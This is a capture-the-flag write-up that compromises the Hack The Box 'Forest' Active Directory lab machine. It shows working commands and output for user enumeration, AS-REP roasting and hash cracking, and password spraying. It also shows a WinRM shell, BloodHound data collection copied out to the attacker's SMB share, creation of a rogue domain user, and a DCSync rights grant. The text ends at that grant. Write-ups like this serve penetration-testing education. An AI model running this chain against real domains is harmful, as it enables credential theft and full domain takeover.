# Forest

![](./images/forest.png)

#### Machine Release Date: Octover 12, 2019

## Active Ports

```bash
sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 -sC -sV -oA nmap/full-tcp-version 10.10.10.161
```

```none
Nmap scan report for 10.10.10.161
Host is up (0.064s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-09 16:09:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/9%Time=5F58FC10%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h29m39s, deviation: 4h02m32s, median: 9m37s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-09-09T09:12:10-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-09T16:12:07
|_  start_date: 2020-09-09T16:05:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  9 12:04:42 2020 -- 1 IP address (1 host up) scanned in 279.02 seconds
```

## Active Directory User Enumeartion Via RPC/NetBIOS

As seen from the nmap scan above, the combination of ports 53,88,389,3268 hint that this host represents an Active Directory domain controller.
I like to see which users exist in the Active Directory forest via RPC/NetBIOS since it provides me with a quick, concise, and stealthier way to enumerate users.
Note that I was able to do this because I was able to establish NULL sessions with NetBIOS without providing any sort of credential:

```none
$ rpcclient -U "" 10.10.10.161
Enter WORKGROUP\'s password:

rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

After enumerating all users, I compiled a wordlist of all existing users.

## Enumeration (Finding AS-REP-roastable Users in Active Directory)

AS-REP-roastable users are those that don't require Kerberos preauthentication. When Kerberos preauthentication is disabled, you can intercept the the encrypted part in the AS-REP which has a secret that is encrypted with the user's password. That secret can then be brute forced offline to get the user's password.  You can read more upon the subject from [harmj0y's blog](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/).

Using impacket's `GetNPUsers.py` will figure out with users have Kerberos preauthentication disabled and will attempt to translate the encrypted secret into a piece of information that can be cracked with an offline brute force attack:

```none
$ python3 ~/tools/impacket/examples/GetNPUsers.py -usersfile users.txt -format hashcat -dc-ip 10.10.10.161 htb.local/
Impacket v0.9.22.dev1+20200826.101917.9485b0c2 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:f05a2b15c6dde44f6d8830c5b0627b34$350048b7786adbdbfe6ac933a80e9488f0a89da3a342c4c49d8ab1161ea628ed24c25a4d07443b5b8db2d60832e686d793651528fa447e8c9abb916be6d4f9a17836a6ec52eed66211cfed3a4aa130e6c065c14965246f640b6e97c49e0cc40b336abc3b297c9d4297079237b69f39731f77cded12c8d3c262ffd7648372953b695094a2bd221ac95b85af908033a3b2f2cd5e819313c3a04924a1be52fb660ce4485968744be4fa0ec1acc63353f110538615496cbfa765a03ad4e634f893dbd7966c89bdd6df0d328b6bd11b1af6ff046db8937bb6a564ba849c5c055b203d3882acc9d4b4
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

As seen above, the `svc-alfresco` user didn't have Kerberos preauthentication enabled, so I was able to translate the secret from the AS-REP into a hash that can be cracked by hashcat.

### Cracking the Secret from the AS-REP Response

I moved the hash to my cracking machine to perform an offline brute force attack to see if I could crack `svc-alfresco`'s password:

```none
PS D:\hashcat\hashcat-6.0.0> .\hashcat.exe -a 0 -m 18200 ..\hashes\forest-svc-alfresco.asreproast ..\wordlists\rockyou.txt
hashcat (v6.0.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #3: Unstable OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 11.0)
====================
* Device #1: GeForce GTX 1650 with Max-Q Design, 3323/4096 MB, 16MCU

OpenCL API (OpenCL 1.2 CUDA 11.0.208) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: GeForce GTX 1650 with Max-Q Design, skipped

OpenCL API (OpenCL 2.1 ) - Platform #2 [Intel(R) Corporation]
=============================================================
* Device #3: Intel(R) UHD Graphics 630, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 345 MB

Dictionary cache hit:
* Filename..: ..\wordlists\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:f05a2b15c6dde44f6d8830c5b0627b34$350048b7786adbdbfe6ac933a80e9488f0a89da3a342c4c49d8ab1161ea628ed24c25a4d07443b5b8db2d60832e686d793651528fa447e8c9abb916be6d4f9a17836a6ec52eed66211cfed3a4aa130e6c065c14965246f640b6e97c49e0cc40b336abc3b297c9d4297079237b69f39731f77cded12c8d3c262ffd7648372953b695094a2bd221ac95b85af908033a3b2f2cd5e819313c3a04924a1be52fb660ce4485968744be4fa0ec1acc63353f110538615496cbfa765a03ad4e634f893dbd7966c89bdd6df0d328b6bd11b1af6ff046db8937bb6a564ba849c5c055b203d3882acc9d4b4:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:f05a2b15c6dde4...c9d4b4
Time.Started.....: Wed Sep 09 13:26:26 2020 (1 sec)
Time.Estimated...: Wed Sep 09 13:26:27 2020 (0 secs)
Guess.Base.......: File (..\wordlists\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2781.2 kH/s (5.12ms) @ Accel:128 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4194304/14344385 (29.24%)
Rejected.........: 0/4194304 (0.00%)
Restore.Point....: 4063232/14344385 (28.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: sadecheverri -> rogans
Hardware.Mon.#1..: Temp: 52c Util: 29% Core:1410MHz Mem:3500MHz Bus:16

Started: Wed Sep 09 13:26:18 2020
Stopped: Wed Sep 09 13:26:29 2020
```

Success! It turns out that `svc-alfresco`'s password was `s3rvice`. At this point, I figured I might as well try a password spraying attack with this password against every single user within the Active Directory domain. But first, it is important to check the Active Directory account lockout policy so that I don't end up locking out any users by accident which would blow my cover and make me look really bad during a real pentest engagement.


### Active Directory Account Lockout Policy

There are a couple of ways to check the Active Directory account lockout policy. The first method is to use RPC/NetBIOS to check the password policy for a given RID. A RID represents a user identity in Windows. In the case below, `0x47b` is the RID for the `svc-alfresco` user.

```none
rpcclient $> getusrdompwinfo 0x47b
    &info: struct samr_PwInfo
        min_password_length      : 0x0007 (7)
        password_properties      : 0x00000000 (0)
               0: DOMAIN_PASSWORD_COMPLEX
               0: DOMAIN_PASSWORD_NO_ANON_CHANGE
               0: DOMAIN_PASSWORD_NO_CLEAR_CHANGE
               0: DOMAIN_PASSWORD_LOCKOUT_ADMINS
               0: DOMAIN_PASSWORD_STORE_CLEARTEXT
               0: DOMAIN_REFUSE_PASSWORD_CHANGE
```

The other way is to enumerate LDAP from the Active Directory domain controller and look for the `lockoutThreshold` attribute.
I was able to dump all information within LDAP I had access to with the following command:


```bash
ldapsearch -h 10.10.10.161 -x -b 'dc=htb,dc=local' > ldap.out
```

Within `ldap.out`:

```none
# Builtin, htb.local
dn: CN=Builtin,DC=htb,DC=local
objectClass: top
objectClass: builtinDomain
cn: Builtin
distinguishedName: CN=Builtin,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190923111324.0Z
uSNCreated: 8199
uSNChanged: 49232
showInAdvancedViewOnly: FALSE
name: Builtin
objectGUID:: SJ+EFqFHq0eydf6K0F19qA==
creationTime: 131131487490386345
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 0
objectSid:: AQEAAAAAAAUgAAAA
serverState: 1
uASCompat: 1
modifiedCount: 421
systemFlags: -1946157056
objectCategory: CN=Builtin-Domain,CN=Schema,CN=Configuration,DC=htb,DC=local
isCriticalSystemObject: TRUE
dSCorePropagationData: 20200909161747.0Z
dSCorePropagationData: 20200909161747.0Z
dSCorePropagationData: 20200909161747.0Z
dSCorePropagationData: 20200909161740.0Z
dSCorePropagationData: 16010101000000.0Z
```

Notice how `lockoutThreshold` is 0. This means that password spraying attacks against active directory users are viable since I can have an unlimited amount of failed password attempts for any user without ever locking them out.

At this point, I figured I might as well try logging in as each user. On Windows, the most low-privileged way to login as a user is via SMB:

```none
$ crackmapexec smb 10.10.10.161 -u users.txt -p s3rvice
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:HTB) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] HTB\Administrator:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\Guest:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\krbtgt:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\DefaultAccount:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\$331000-VK4ADACQNUCA:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_2c8eef0a09b545acb:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_ca8c2ed5bdab4dc9b:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_75a538d3025e4db9a:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_681f53d4942840e18:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_1b41c9286325456bb:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_9b69f1b9d2cc45549:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_7c96b981967141ebb:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_c75ee099d0a64c91b:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\SM_1ffab36a2f5f479cb:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailboxc3d7722:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailboxfc9daad:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailboxc0a90c9:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox670628e:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox968e74d:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox6ded678:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox83d6781:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailboxfd87238:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailboxb01ac64:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox7108a4e:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\HealthMailbox0659cc1:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\sebastien:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [-] HTB\lucinda:s3rvice STATUS_LOGON_FAILURE
SMB         10.10.10.161    445    FOREST           [+] HTB\svc-alfresco:s3rvice
```

I was only able to login as the `svc-alfreso` user, so the password was not reused amongst the other users.
Since I has the password for the `svc-alfreso` user, I figured I might as well try logging in with WinRM:

```none
$ ./evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> gc C:\Users\svc-alfresco\Desktop\user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

As seen above, I was able to successfully login and grab the `user.txt` flag.

## Privilege Escalation (Abusing WriteDACL from Windows Exchange Privileges)

On Windows machines, I always check for my current user's groups and privileges:

```none
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.
```

In the case above, some noteworthy groups are the following groups:

* `BUILTIN\Remote Management Users` -> Have permission to access the machine via WinRM.
* `BUILTIN\Account Operators` -> Have permission to manage non-admin accounts.

Since I might be able to abuse the `BUILTIN\Account Operators` group, I figured I should try seeing if being part of this group could potentially escalate my permissions to a domain admin. A great tool for visualizing the shortest path to higher privileged users on the Active Directory domain is [bloodhound](https://github.com/BloodHoundAD/BloodHound).

Since bloodhound is only a visualiztion tool, it first needs data. I was able to collect Active Directory data to visualize by using [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) which will collect data from Active Directory which I can then load into `BloodHound`.

```none
*Evil-WinRM* PS C:\Windows\Temp\r0kit> upload '/home/kali/tools/BloodHound/Ingestors/SharpHound.exe'
Info: Uploading /home/kali/tools/BloodHound/Ingestors/SharpHound.exe to C:\Windows\Temp\r0kit\SharpHound.exe


Data: 1111380 bytes of 1111380 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Windows\Temp\r0kit> ls


    Directory: C:\Windows\Temp\r0kit


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/9/2020  12:16 PM         833536 SharpHound.exe


*Evil-WinRM* PS C:\Windows\Temp\r0kit> .\SharpHound.exe
-----------------------------------------------
Initializing SharpHound at 12:16 PM on 9/9/2020
-----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=HTB,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 124 objects finished (+124 41.33333)/s -- Using 27 MB RAM
Enumeration finished in 00:00:03.7526732
Compressing data to .\20200909121627_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:16 PM on 9/9/2020! Happy Graphing!
```

I then copied the zip file created by SharpHound to the remote share on my Kali machine:

```none
*Evil-WinRM* PS C:\Windows\Temp\r0kit> $pass = ConvertTo-SecureString "h4ckit" -AsPlainText -Force
*Evil-WinRM* PS C:\Windows\Temp\r0kit> $creds = New-Object System.Management.Automation.PSCredential("r0kit",$pass)
*Evil-WinRM* PS C:\Windows\Temp\r0kit> New-PSDrive -Name r -PSProvider FileSystem -Root \\10.10.14.24\r0kit -Credential $creds


Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
r                                      FileSystem    \\10.10.14.24\r0kit

*Evil-WinRM* PS C:\Windows\Temp\r0kit> cp 20200909121627_BloodHound.zip r:\
```

```none
$ sudo python3 ~/tools/impacket/examples/smbserver.py r0kit shared/ -username r0kit -password h4ckit -smb2support
[sudo] password for kali:
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.161,63585)
[*] AUTHENTICATE_MESSAGE (\r0kit,FOREST)
[*] User FOREST\r0kit authenticated successfully
[*] r0kit:::4141414141414141:cca7771ab78be8ea5cb19236519945b6:01010000000000008082d239dd86d6012b5ff6c8e0002008000000000100100046004b0043007a007700440051006c000300100046004b0043007a007700440051006c00020010006e00530075005000620067006b007700040010006e00530075005000620067006b007700070008008082d239dd86d6010600040002000000080030003000000000000000000000000020000051a6d0303c9e21414254c01ec24314e2a3f6babd3ef531c9be9facccafeb95090a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:r0kit)
```

After importing `20200909121627_BloodHound.zip` into bloodhound, I was able to find the shortest path to high value targets:

![](./images/forest-bloodhound-reachable-high-value-targets.png)

As seen in the image above, it looks like the owned `svc-alfresco` user has an implicit path to becoming a system administrator.
Looking carefully at the `Exchange Windows Permissions` group, it has `WriteDACL` permissions. In Active Directory, a DACL in Active Directory lingo is an acronym for **Discretionary Access Control List**, which is a list specifying which Active Directory users are able to access particular Active Directory objects and the actions they can perform on them.
Since I have full control over DACLs for all non-admin users, I should eventually be able to grant a user under my control the ability to replicate the domain controller, ultimately dumping the NTLM hashes for each user in the Active Directory forest.
This [article](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/) explains how to abuse these permissions to escalate to a domain admin in depth.
You can then abuse these [permissions](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) to synchornize a domain controller.

![](./images/forest-bloodhound-windows-exchange-permissions.png)

In short, I should be able to escalate my permissions to a domain admin by:

1. Create a new user.
2. Add the new user to the `Exchange Windows Permissions` group.
3. On behalf of the new user, grant it the ability to syncrhonize the domain controller which should be sufficient to dump the NTLM hash for each user in the Active Directory forest. 

I went ahead and executed the plan above. As the `svc-alfresco` user:

```none
*Evil-WinRM* PS C:\users> net user r0kit h4ckit!! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" r0kit /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" r0kit /add
The command completed successfully.
```

At this point, I logged into forest as the newly added `r0kit` user:

```none
kali@kali:~/htb/boxes/forest/loot$ ~/tools/evil-winrm/evil-winrm.rb -u r0kit -p 'h4ckit!!' -i 10.10.10.161

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\r0kit\Documents> whoami /all

USER INFORMATION
----------------

User Name SID
========= =============================================
htb\r0kit S-1-5-21-3072663084-364016917-1341370565-7603


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Exchange Windows Permissions           Group            S-1-5-21-3072663084-364016917-1341370565-1121 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

I then granted the `r0kit` user the ability to synchronize the domain controller using the `PowerView.ps1` script from the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) post-exploitation framework:


```none
*Evil-WinRM* PS C:\Windows\Temp\r0kit2> upload '/home/kali/tools/PowerSploit/Recon/PowerView.ps1'
Info: Uploading /home/kali/tools/PowerSploit/Recon/PowerView.ps1 to C:\Windows\Temp\r0kit2\PowerView.ps1


Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!


*Evil-WinRM* PS C:\Windows\Temp\r0kit2> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Windows\Temp\r0kit2> Add-DomainObjectAcl -PrincipalIdentity r0kit -Rights DCSync
```

